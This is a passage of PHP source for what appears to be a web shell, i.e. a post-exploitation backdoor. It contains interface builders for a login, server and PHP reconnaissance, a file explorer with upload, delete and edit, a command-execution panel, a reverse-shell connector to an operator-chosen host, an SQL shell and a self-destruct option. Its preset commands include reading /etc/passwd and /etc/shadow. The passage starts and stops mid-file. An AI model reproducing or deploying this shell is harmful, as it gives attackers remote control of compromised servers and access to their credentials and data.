sAYirTrKWDG5Fu0psCEynObAWNo5USktQmUdAuQ6rUAYU6S6ww0VgHoUHtOZQBaU7QCYEykjdsSaENhC0CVK6kezEuwQ4ZawvWWIPUBOF4siAPEYEcSgG9VLiUGT8VGlxQXSrB9H/0v7CcwAUs5WJgnhQAAAABJRU5ErkJggg==',
		'file' => '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'
	);
	
	/**
	 * Returns the base64 string of the selected icon
	 *
	 * @param $_icon string
	 * @return string
	 */
	static function getIcon($_icon)
	{
		return self::$icons[$_icon];
	}
}

/**
 * Class Html
 * Holds all the html code for the user interface.
 *
 * @function getLoginForm
 * @function getNavbar
 * @function getServerInfo
 * @function getDileExplorer
 * @function getShell
 * @function getReverseShell
 * @function getSqlShell
 * @function getLocation
 * @function getSelfDestruct
 * @function getEditor
 */
class Html 
{
	/**
	 * Returns the html for the login form. Warns the user if the connection is plain http.
	 *
	 * @param bool $error
	 * @param bool $https
	 * @return array
	 */
	static function getLoginForm($error = false, $https = true) 
	{
		$h[] = '<div class="row" id="form-login">';
		$h[] = '	<div class="col-md-4 col-sm-12 col-xs-12 col-md-offset-4">';
		$h[] = '	    <div class="panel panel-default">';
		$h[] = '	        <div class="panel-heading">';
		$h[] = '	            Login';
		$h[] = '            </div>';
		$h[] = '            <div class="panel-body">';
		$h[] = '	            <form role="form" class="form-horizontal" method="post" action="?action=login" accept-charset="UTF-8">';
		if (!$https) 
		{
			$h[] = '				<div class="alert alert-warning">[WARNING] The connection to the Server is not encrypted!</div>';
		}
        if ($error)
		{
            $h[] = '                <div class="alert alert-warning">[ERROR] Access denied!</div>';
        }
		if (GEO) 
		{
			$h[] = '				<div class="alert alert-warning">[INFO] Login may last some time because Information on Geo location is retrieved.</div>';
		}
        $h[] = '                    <div class="form-group">';
        $h[] = '	                    <div class="col-md-12">';
        $h[] = ' 	                       <input type="text" id="username" name="username" class="form-control" placeholder="Username">';
        $h[] = '                        </div>';
        $h[] = '                    </div>';
        $h[] = '                	<div class="form-group">';
		$h[] = '						<div class="col-md-12">';
		$h[] = '							<input type="password" id="password" name="password" class="form-control" placeholder="Password">';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-4 col-sm-12 col-xs-12 col-md-offset-8">';
		$h[] = '							<input type="submit" id="login" class="form-control btn btn-success" value="Login">';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '				</form>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
        return $h;
	}

	/**
	 * returns the html for the navigation bar. The active menu item has the html class .active appended and gets highlighted.
	 *
	 * @return array
	 */
	static function getNavbar() 
	{
		$h[] = '<nav class="navbar navbar-static-top navbar-inverse" role="navigation">';
	    $h[] = '	<div class="navbar-header">';
		$h[] = '	    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navi">';
	    $h[] = '	        <span class="sr-only">Toggle navigation</span>';
		$h[] = '            <span class="icon-bar"></span>';
		$h[] = '            <span class="icon-bar"></span>';
		$h[] = '            <span class="icon-bar"></span>';
		$h[] = '        </button>';
		$h[] = '    </div>';
		$h[] = '    <div id="navi" class="collapse navbar-collapse">';
		$h[] = '	    <ul class="nav navbar-nav">';
		$h[] = '	        <li'.(isset($_GET['menu'])&&$_GET['menu']=='server' ? ' class="active"' : '' ).'><a href="?menu=server">Server</a></li>';
		$h[] = '            <li'.(isset($_GET['menu'])&&$_GET['menu']=='files' ? ' class="active"' : '' ).'><a href="?menu=files">Files</a></li>';
		$h[] = '            <li'.(isset($_GET['menu'])&&$_GET['menu']=='shell' ? ' class="active"' : '' ).'><a href="?menu=shell">Shell</a></li>';
		$h[] = '            <li'.(isset($_GET['menu'])&&$_GET['menu']=='reverseshell' ? ' class="active"' : '' ).'><a href="?menu=reverseshell">Reverse Shell</a></li>';
		$h[] = '            <li'.(isset($_GET['menu'])&&$_GET['menu']=='sqlshell' ? ' class="active"' : '' ).'><a href="?menu=sqlshell">SQL Shell</a></li>';
		$h[] = '            <li'.(isset($_GET['menu'])&&$_GET['menu']=='phpinfo' ? ' class="active"' : '' ).'><a href="?menu=phpinfo">PHP Info</a></li>';
		$h[] = '            <li'.(isset($_GET['menu'])&&$_GET['menu']=='selfdestruct' ? ' class="active"' : '' ).'><a href="?menu=selfdestruct">Self destruct</a></li>';
		if (GEO)
		{
			$h[] = '        <li'.(isset($_GET['menu'])&&$_GET['menu']=='location' ? ' class="active"' : '' ).'><a href="?menu=location">Location</a></li>';
		}
		$h[] = '            <li><a href="?menu=logout">Logout</a></li>';
		$h[] = '        </ul>';
		$h[] = '    </div>';
		$h[] = '</nav>';
		return $h;
	}

	/**
	 * Returns the html for the server info site. On Linux machines an additional column holding
	 * memory info is shown.
	 *
	 * @return array
	 */
	static function getServerInfo() 
	{
		$disabled = ini_get('disable_functions');
		$disabled = explode(',', $disabled);
		$h[] = '<div class="row">';
		if (strtolower(substr(php_uname('s'), 0, 3)) == 'lin') 
		{
			$h[] = '<div class="col-md-4 col-sm-12 col-xs-12">';
		}
		else
		{
			$h[] = '<div class="col-md-6 col-sm-12 col-xs-12">';
		}
		/*
		 * Server Info
		 */
		$h[] = '   	   <div class="panel panel-default">';
		$h[] = '   	   	   <div class="panel-heading">';
		$h[] = '   	   	   	   Server Info';
		$h[] = '		   </div>';
		$h[] = '		   <div class="panel-body">';
		$h[] = '		   	   <table class="table">';
		$h[] = '		   	   	   <tbody>';
		$h[] = '		   	   	       <tr>';
		$h[] = '		   	   	           <td>LAN IP</td>';
		$h[] = '		   	   	           <td>'.$_SERVER['SERVER_ADDR'].'</td>';
		$h[] = '					   </tr>';
		if (GEO)
		{
			$h[] = '		   	       <tr>';
			$h[] = '		   	           <td>WAN IP</td>';
			$h[] = '		   	           <td>'.(isset($_SESSION['external_ip']) ? $_SESSION['external_ip'] : '').'</td>';
			$h[] = '				   </tr>';
		}
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Port</td>';
		$h[] = '		   	   	           <td>'.$_SERVER['SERVER_PORT'].'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Hostname</td>';
		$h[] = '		   	   	           <td>'.php_uname('n').'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>OS</td>';
		$h[] = '		   	   	           <td>'.php_uname('s').'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Release</td>';
		$h[] = '		   	   	           <td>'.php_uname('r').'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Machine Type</td>';
		$h[] = '		   	   	           <td>'.php_uname('m').'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Load</td>';
		$h[] = '		   	   	           <td>'.Funcs::getCpuLoad().'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Server Software</td>';
		$h[] = '		   	   	           <td>'.$_SERVER['SERVER_SOFTWARE'].'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Protocol</td>';
		$h[] = '		   	   	           <td>'.$_SERVER['SERVER_PROTOCOL'].'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Server Admin</td>';
		$h[] = '		   	   	           <td>'.$_SERVER['SERVER_ADMIN'].'</td>';
		$h[] = '					   </tr>';
		$h[] = '					   <tr>';
		$h[] = '		   	   	           <td>Document Root</td>';
		$h[] = '		   	   	           <td>'.$_SERVER['DOCUMENT_ROOT'].'</td>';
		$h[] = '					   </tr>';
		$h[] = '				   </tbody>';
		$h[] = '			   </table>';
		$h[] = '		   </div>';
		$h[] = '	   </div>';
		$h[] = '   </div>';

		/*
		 * L I N U X  O N L Y
		 * Displays information on RAM usage
		 */
		if (strtolower(substr(php_uname('s'), 0, 3)) == 'lin') 
		{
			$h[] = '    <div class="col-md-4 col-sm-12 col-xs-12">';
			$h[] = '		<div class="panel panel-default">';
			$h[] = '			<div class="panel-heading">';
			$h[] = '				Memory Info';
			$h[] = '			</div>';
			$h[] = '			<div class="panel-body">';
			$h[] = '				<table class="table">';
			$h[] = '					<tbody>';
			foreach (Funcs::getSystemMemInfo() as $key => $value) 
			{
				$h[] = '					<tr>';
				$h[] = '						<td>'.$key.'</td>';
				$h[] = '						<td>'.$value.'</td>';
				$h[] = '					</tr>';
			}
			$h[] = '					</tbody>';
			$h[] = '				</table>';
			$h[] = '			</div>';
			$h[] = '		</div>';
			$h[] = '	</div>';
			$h[] = '	<div class="col-md-4 col-sm-12 col-xs-12">';
		}
		else 
		{
			$h[] = '    <div class="col-md-6 col-sm-12 col-xs-12">';
		}
		/*
		 * PHP info
		 */
		$h[] = '   	    	<div class="panel panel-default">';
		$h[] = '   	   	    	<div class="panel-heading">';
		$h[] = '   	   	   	    	PHP Info';
		$h[] = '		   		</div>';
		$h[] = '		   		<div class="panel-body">';
		$h[] = '		   	   		<table class="table">';
		$h[] = '		   	   	   		<tbody>';
		$h[] = '		   	   	   	   		<tr>';
		$h[] = '		   	   	           		<td>Safe Mode</td>';
		$h[] = '		   	   	           		<td>'.(ini_get('safe_mode') ? '<span class="red">On</span>' : 'Off').'</td>';
		$h[] = '					   		</tr>';
		$h[] = '		   	   	       		<tr>';
		$h[] = '		   	   	           		<td>Version</td>';
		$h[] = '		   	   	           		<td>'.phpversion().'</td>';
		$h[] = '					   		</tr>';
		$h[] = '					   		<tr>';
		$h[] = '		   	   	           		<td>Zend Engine</td>';
		$h[] = '		   	   	           		<td>'.zend_version().'</td>';
		$h[] = '					   		</tr>';
		$h[] = '					   		<tr>';
		$h[] = '		   	   	           		<td>Disabled functions</td>';
		$h[] = '		   	   	           		<td>'.implode(', ', $disabled).'</td>';
		$h[] = '					   		</tr>';
		$h[] = '				   		</tbody>';
		$h[] = '			   		</table>';
		$h[] = '		   		</div>';
		$h[] = '	   		</div>';
		$h[] = '    	</div>';
		
		/* 
		 * Provider Info; Can be disabled by setting GEO to false.
		 */
		if (GEO) {
			if (strtolower(substr(php_uname('s'), 0, 3)) == 'lin') 
			{
				$h[] = '<div class="col-md-4 col-sm-12 col-xs-12">';
			}
			else 
			{
				$h[] = '<div class="col-md-6 col-sm-12 col-xs-12">';
			}
			$h[] = '		<div class="panel panel-default">';
			$h[] = '			<div class="panel-heading">';
			$h[] = '				Provider Info';
			$h[] = '			</div>';
			$h[] = '			<div class="panel-body">';
			$h[] = '				<table class="table">';
			$h[] = '					<tbody>';
			$h[] = '						<tr>';
			$h[] = '							<td>Company</td>';
			$h[] = '							<td>'.$_SESSION['geo']['org'].'</td>';
			$h[] = '						</tr>';
			$h[] = '						<tr>';
			$h[] = '							<td>City</td>';
			$h[] = '							<td>'.$_SESSION['geo']['city'].'</td>';
			$h[] = '						</tr>';
			$h[] = '						<tr>';
			$h[] = '							<td>State</td>';
			$h[] = '							<td>'.$_SESSION['geo']['regionName'].'</td>';
			$h[] = '						</tr>';
			$h[] = '						<tr>';
			$h[] = '							<td>Country</td>';
			$h[] = '							<td>'.$_SESSION['geo']['country'].'</td>';
			$h[] = '						</tr>';
			$h[] = '						<tr>';
			$h[] = '							<td>Timezone</td>';
			$h[] = '							<td>'.$_SESSION['geo']['timezone'].'</td>';
			$h[] = '						</tr>';
			$h[] = '						<tr>';
			$h[] = '							<td>Latitude</td>';
			$h[] = '							<td>'.$_SESSION['geo']['lat'].'</td>';
			$h[] = '						</tr>';
			$h[] = '						<tr>';
			$h[] = '							<td>Longitude</td>';
			$h[] = '							<td>'.$_SESSION['geo']['lon'].'</td>';
			$h[] = '						</tr>';
			$h[] = '					</tbody>';
			$h[] = '				</table>';
			$h[] = '			</div>';
			$h[] = '		</div>';
			$h[] = '	</div>';
		} 
		$h[] = '</div>';
		return $h;
	}

	/**
	 * Returns the html for the File explorer.
	 *
	 * @param string $_cwd
	 * @param int $_error
	 * @return array
	 */
	static function getFileExplorer($_cwd, $_error = null) 
	{
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-12">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				File explorer: <strong>' . $_cwd . '</strong>';
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
		if ($_error == 1)
		{
			$h[] = ' 			<div class="alert alert-danger" role="alert" id="explorererror">';
			$h[] = '				An error occured. Maybe you don\'t have the permission to perform this action.';
			$h[] = '			</div>';
		}
		$h[] = ' 				<div class="alert alert-danger" role="alert" id="explorererror">';
		$h[] = '					An error occured. Maybe you don\'t have the permission to perform this action.';
		$h[] = '				</div>';
		$h[] = '				<input type="hidden" name="dirname" id="dirname" value="' . $_cwd . '">';
		$h[] = '				<table class="table">';
		$h[] = '					<thead>';
		$h[] = '						<tr>';
		$h[] = '							<th>Name</th>';
		$h[] = '							<th>Size</th>';
		$h[] = '							<th>Type</th>';
		$h[] = '							<th>Owner</th>';
		$h[] = '							<th>Permissions</th>';
		$h[] = '							<th>Action</th>';
		$h[] = '						</tr>';
		$h[] = '					</thead>';
		$h[] = '					<tbody>';
		foreach(scandir($_cwd) as $filename)
		{
			$perms=array('---','--x','-w-','r--','r-x','rw-','rwx');
			$octalperms = substr(sprintf('%o', fileperms($filename)), -4);
			$owner = $octalperms[1];
			$group = $octalperms[2];
			$public = $octalperms[3];
			$h[] = '					<tr>';
			// Filename
			$h[] = '						<td>'.(is_dir($_cwd . DIRECTORY_SEPARATOR . $filename) ?  '<a class="directory_link" href="?ajax=files&action=chdir&dir='.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Change Directory to '.$_cwd . DIRECTORY_SEPARATOR . $filename.'"><img src="data:image/png;base64,'.Icon::getIcon('folder').'"> '.$filename.'</a>' : '<img src="data:image/png;base64,'.Icon::getIcon('file').'"> '. $filename) .'</td>';
			// Filesize
			$h[] = '						<td>'.(is_file($_cwd . DIRECTORY_SEPARATOR . $filename) ? filesize($_cwd . DIRECTORY_SEPARATOR . $filename) : '4096') . '</td>';
			// Filetype
			$h[] = '						<td>'.filetype($_cwd . DIRECTORY_SEPARATOR . $filename).'</td>';
			$h[] = '						<td width="10%">'.posix_getpwuid(fileowner($_cwd . DIRECTORY_SEPARATOR . $filename))['name'].'</td>';
			$h[] = '						<td>'.(is_dir($filename)?'d':'-').$perms[$owner].$perms[$group].$perms[$public].'</td>';
			$h[] = '						<td>';
			// Actions (download, delete, copy, edit, rename)
			if (is_file($_cwd . DIRECTORY_SEPARATOR . $filename) && filetype($_cwd . DIRECTORY_SEPARATOR . $filename) != 'link')
			{
				$h[] = '						<a href="?ajax=files&action=download&file='.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Download file"><img src="data:image/png;base64,'.Icon::getIcon('download').'"></a>&nbsp;';
				$h[] = '						<a href="#" id="'.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Copy File" class="copy-btn"><img src="data:image/png;base64,'.Icon::getIcon('copy').'"></a>&nbsp';
				$h[] = '						<a href="?ajax=files&action=delete&file='.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Delete File"><img src="data:image/png;base64,'.Icon::getIcon('delete').'"></a>&nbsp;';
				$h[] = '						<a href="?menu=editor&file='.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Edit file" class="edit"><img src="data:image/png;base64,'.Icon::getIcon('edit').'"></a>&nbsp;';
				$h[] = '						<a href="'.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Move" class="moveto-btn"><img src="data:image/png;base64,'.Icon::getIcon('rename').'"></a>';
				$h[] = '						<input type="text" class="moveto" placeholder="/path/file.name">';
			}
			elseif (is_dir($_cwd . DIRECTORY_SEPARATOR . $filename) && filetype($_cwd . DIRECTORY_SEPARATOR . $filename) != 'link' && $filename != '..' && $filename != '.')
			{
				$h[] = '						<a href="?ajax=files&action=download&file='.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Download file"><img src="data:image/png;base64,'.Icon::getIcon('download').'"></a>&nbsp;';
				$h[] = '						<a href="?ajax=files&action=delete&file='.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Delete File"><img src="data:image/png;base64,'.Icon::getIcon('delete').'"></a>&nbsp;';
				if (isset($_SESSION['copy']) && $_SESSION['copy'] == 1)
				{
					$h[] = '<a href="'.urlencode($_cwd . DIRECTORY_SEPARATOR . $filename).'" title="Paste File" class="paste-btn"><img src="data:image/png;base64,'.Icon::getIcon('paste').'"></a>&nbsp;';
				}
			}
			$h[] = '						</td>';
			$h[] = '					</tr>';
		}
		$h[] = '						<tr>';
		$h[] = '							<td>';
		$h[] = '								<div class="input-group">';
		$h[] = '									<input type="file" name=uploadfilename id="uploadfilename" class="form-control">';
		$h[] = '									<span class="input-group-btn">';
		$h[] = '										<button type="button" id="upload-btn" class="btn btn-success">upload</button>';
		$h[] = '									</span>';
		$h[] = '								</div>';
		$h[] = '							</td>';
		$h[] = '							<td>';
		$h[] = '								<div class="input-group">';
		$h[] = '									<input type="text" name=mkdirname id="mkdirname" class="form-control" placeholder="Directory name">';
		$h[] = '									<span class="input-group-btn">';
		$h[] = '										<button type="button" id="mkdir-btn" class="btn btn-success">mkdir</button>';
		$h[] = '									</span>';
		$h[] = '								</div>';
		$h[] = '							</td>';
		$h[] = '							<td>';
		$h[] = '								<div class="input-group">';
		$h[] = '									<input type="text" name=mkfilename id="mkfilename" class="form-control" placeholder="File name">';
		$h[] = '									<span class="input-group-btn">';
		$h[] = '										<button type="button" id="mkfile-btn" class="btn btn-success">mkfile</button>';
		$h[] = '									</span>';
		$h[] = '								</div>';
		$h[] = '							</td>';
		$h[] = '							<td></td>';
		$h[] = '						</tr>';
		$h[] = '					</tbody>';
		$h[] = '				</table>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
		return $h;
	}

	/**
	 * Returns the html code for the exevute shell.
	 *
	 * @return array
	 */
	static function getShell() 
	{
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-12">';
		$h[] = '  		<div class="panel panel-default">';
		$h[] = '	  		<div class="panel-heading">';
		$h[] = '  	  	  		Execute Shell';
		$h[] = '		  	</div>';
		$h[] = '		  	<div class="panel-body">';
		$h[] = '		  	   <form class="form-horizontal" role="form" accept-charset="UTF-8" method="post" action="#">';
		$h[] = '		  	   	   <div class="form-group">';
		$h[] = '		  	   	       <div class="col-md-12">';
		$h[] = '		  	   	       	   <textarea class="form-control" readonly id="shellresult"></textarea>';
		$h[] = '					   </div>';
		$h[] = '				   </div>';
		$h[] = '				   <div class="form-group">';
		$h[] = '				       <div class="col-md-7">';
		$h[] = '				           <input type="text" id="shellcommand" name="shellcommand" class="form-control" placeholder="'.implode(PHP_EOL,Funcs::executeShellCommand('whoami')).'@'.php_uname('n').':'.(php_uname('n') == 'root' ? '~# ' : '~$ ').'">';
		$h[] = '					   </div>';
		$h[] = '					   <div class="col-md-3">';
		$h[] = '					   	   <select id="precommand" name="precommand" class="form-control">';
		$h[] = '						       <option value="manual" title="Enter command in the field left beyond this menu">--- Choose predefined Command ---</option>';
		// Linux
		if (substr(strtolower(php_uname('s')), 0, 3) === 'lin') 
		{
			$h[] = '						   <option value="whoami" title="Returns the name of the current user">whoami</option>';
			$h[] = '						   <option value="groups" title="Retutns the groups the cuurent user is member of">groups</option>';
			$h[] = '						   <option value="pwd" title="Returns the current directory">pwd</option>';
			$h[] = '						   <option value="ls -la" title="Returns the content of the content of the current directory">ls -la</option>';
			$h[] = '						   <option value="ps -aux" title="Returns the currently running processes">ps -aux</option>';
			$h[] = '						   <option value="ifconfig -a" title="Returns informations of the available network interfaces">ifconfig -a</option>';
			$h[] = '						   <option value="uname -a" title="Returns the version of the kernel">uname -a</option>';
			$h[] = '						   <option value="uname -r" title="Returns the full name of the current kernel">uname- r</option>';
			$h[] = '						   <option value="cat /etc/passwd" title="Returns the content of /etc/passwd">cat /etc/passwd</option>';
			$h[] = '						   <option value="cat /etc/shadow" title="Returbs the cobtebt of /etc/shadow (if available)">cat /etc/shadow</option>';
			$h[] = '						   <option value="netstat -atnp | grep LISTEN" title="Returns the ports the host is currnetly listening on">netstat -antp | grep LISTEN</option>';
			$h[] = '						   <option value="netstat -tulpen">netstat -tulpen</option>';
		}
		// Windows
		elseif (substr(strtolower(php_uname('s')), 0, 3) === 'win') 
		{
			$h[] = '						   <option value="dir">dir</option>';
			$h[] = '						   <option value="ipconfig">ipconfig</option>';
			$h[] = '						   <option value="netstat -tulpen">netstat -tulpen</option>';
		}
		$h[] = '						   </select>';
		$h[] = '					   </div>';
		$h[] = '					   <div class="col-md-2 col-sm-12 col-xs-12">';
		$h[] = '					       <button type="button" id="executeshellcommand" class="btn btn-success form-control">Execute!</button>';
		$h[] = '					   </div>';
		$h[] = '				   </div>';
		$h[] = '			   </form>';
		$h[] = '           </div>';
		$h[] = '		</div>';
		$h[] = '    </div>';
		$h[] = '</div>';
		return $h;
	}

	/**
	 * Returns the html code for the reverse shell.
	 *
	 * @return array
	 */
	static function getReverseShell() 
	{
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-6 col-sm-12 col-xs-12 col-md-offset-3">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				Reverse Shell';
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
		$h[] = '				<div id="connectinginfo" class="alert alert-success">';
		$h[] = '					Connecting...';
		$h[] = '					<img src="data:image/png;base64,'.Icon::getIcon('loading').'" width="48">';
		$h[] = '				</div>';
		$h[] = '				<div id="connectionterminated" class="alert alert-danger">';
		$h[] = '					Connection terminated';
		$h[] = '				</div>';
		$h[] = '				<form id="reverseshellform" class="form-horizontal" method="post" action="?ajax=reverseShell" accept-charset="UTF-8">';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-12">';
		$h[] = '							<input type="text" id="host" name="host" class="form-control" placeholder="IP / Hostname">';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-12">';
		$h[] = '							<input type="number" id="port" name="port" class="form-control" placeholder="Port">';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<button type="button" id="startreverseshell" class="btn btn-success">Connect</button>';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '				</form>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
		return $h;
	}

	/**
	 * Returns the html code for the SQL Shell.
	 *
	 * @return array
	 */
	static function getSqlShell() 
	{
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-6 col-sm-12">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				SQL Query';
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
		$h[] = '				<form class="form-horizontal" method="post" action="?menu=sqlshell&submit" accept-charset="UTF-8">';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<input type="text" id="dbhost" name="dbhost" class="form-control" placeholder="DB Host">';
		$h[] = '						</div>';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<input type="text" id="dbuser" name="dbuser" class="form-control" placeholder="DB User">';
		$h[] = '						</div>';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<input type="password" id="dbpass" name="dbpass" class="form-control" placeholder="DB Password">';
		$h[] = '						</div>';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<input type="text" id="dbname" name="dbname" class="form-control" placeholder="DB Name">';
		$h[] = '						</div>';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<input type="number" id="dbport" name="dbport" class="form-control" placeholder="DB Port">';
		$h[] = '						</div>';
		$h[] = '						<div class="col-md-2">';
		$h[] = '							<button type="button" class="btn btn-success" id="sqlquery-button">Query</button>';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-12">';
		$h[] = '							<textarea id="query" name="query" class="form-control" placeholder="Type in SQL statement"></textarea>';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '				</form>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '	<div class="col-md-6 col-sm-12">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				Result';
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
